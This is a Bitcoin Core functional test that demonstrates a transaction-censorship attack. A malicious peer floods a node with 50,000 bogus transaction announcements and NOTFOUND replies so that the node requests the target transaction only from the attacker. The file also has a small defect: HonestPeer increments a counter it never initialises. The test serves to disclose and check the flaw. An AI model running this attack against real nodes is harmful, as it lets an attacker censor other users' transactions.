#!/usr/bin/env python3
# Copyright (c) 2019 The Bitcoin Core developers
# Distributed under the MIT software license, see the accompanying
# file COPYING or http://www.opensource.org/licenses/mit-license.php.
"""
Censor a transaction to a node by taking over its g_already_asked_for
"""

from test_framework.messages import (
    CInv,
    MSG_TX,
    MSG_TYPE_MASK,
    msg_inv,
    msg_notfound,
)
from test_framework.mininode import (
    P2PInterface,
    mininode_lock,
)
from test_framework.test_framework import BitcoinTestFramework
from test_framework.util import (
    wait_until,
)

CENSORED_TX = 0xbefaded

class HonestPeer(P2PInterface):
    def __init__(self):
        super().__init__()
        self.censored_tx_count = 0

    def on_getdata(self, message):
        for i in message.inv:
            if i.type & MSG_TYPE_MASK == MSG_TX:
                self.tx_getdata_count += 1
                if i.hash == CENSORED_TX:
                    self.censored_tx_count += 1

class MaliciousPeer(P2PInterface):
    def __init__(self):
        super().__init__()
        self.tx_getdata_count = 0
        self.censored_tx_count = 0

    def on_getdata(self, message):
        notfound_txids = []
        for i in message.inv:
            if i.type & MSG_TYPE_MASK == MSG_TX:
                self.tx_getdata_count += 1
                if i.hash == CENSORED_TX:
                    self.censored_tx_count += 1
                else:
                    notfound_txids.append(i.hash)

        # Send NOTFOUNDs for the bogus txids immediately
        if len(notfound_txids):
            msg = msg_notfound([CInv(t=1, h=txid) for txid in notfound_txids])
            self.send_message(msg)

class CensorTx(BitcoinTestFramework):
    def set_test_params(self):
        self.setup_clean_chain = False
        self.num_nodes = 1

    def run_test(self):
        node = self.nodes[0]

        # Setup the p2p connections
        NUM_HONEST = 7
        honest_connections = []
        for node in self.nodes:
            for i in range(NUM_HONEST):
                honest_connections.append(node.add_p2p_connection(HonestPeer()))
        malicious_connection = node.add_p2p_connection(MaliciousPeer())  # malicious peer

        self.log.info("Announce the censored transaction txid from the malicious peer")

        msg = msg_inv([CInv(t=1, h=CENSORED_TX)])
        malicious_connection.send_message(msg)
        malicious_connection.sync_with_ping()

        self.log.info("Wait for censored transaction request")
        wait_until(lambda: malicious_connection.censored_tx_count >= 1, lock=mininode_lock, timeout=10)

        self.log.info("Announce the censored transaction txid from several honest peers")
        for conn in honest_connections:
            conn.send_message(msg)
            conn.sync_with_ping()

        # Clear out the victim's g_already_asked_for with bogus txids
        # Send INVs for bogus txids and respond to the GETDATAs with
        # NOTFOUNDs immediately
        self.log.info("Clear out g_already_asked_for")
        invs = [CInv(t=1, h=i) for i in range(1, 50001)]
        self.log.info("invs constructed")
        msg = msg_inv(invs)
        malicious_connection.send_message(msg)
        malicious_connection.sync_with_ping()

        wait_until(lambda: malicious_connection.tx_getdata_count >= 50000, lock=mininode_lock)
        # We've received GETDATAs for all bogus txids and replied with NOTFOUNDs

        self.log.info("send NOTFOUND for censored transaction")
        msg = msg_notfound([CInv(t=1, h=CENSORED_TX)])
        malicious_connection.send_message(msg)
        malicious_connection.sync_with_ping()

        self.log.info("reINV censored transaction")
        msg = msg_inv([CInv(t=1, h=CENSORED_TX)])
        malicious_connection.send_message(msg)
        malicious_connection.sync_with_ping()

        self.log.info("wait for censored transaction request")
        wait_until(lambda: malicious_connection.censored_tx_count >= 2, lock=mininode_lock)

        # The victim only asks the malicious peer for the censored txid
        for conn in honest_connections:
            assert conn.censored_tx_count == 0

if __name__ == '__main__':
    CensorTx().main()
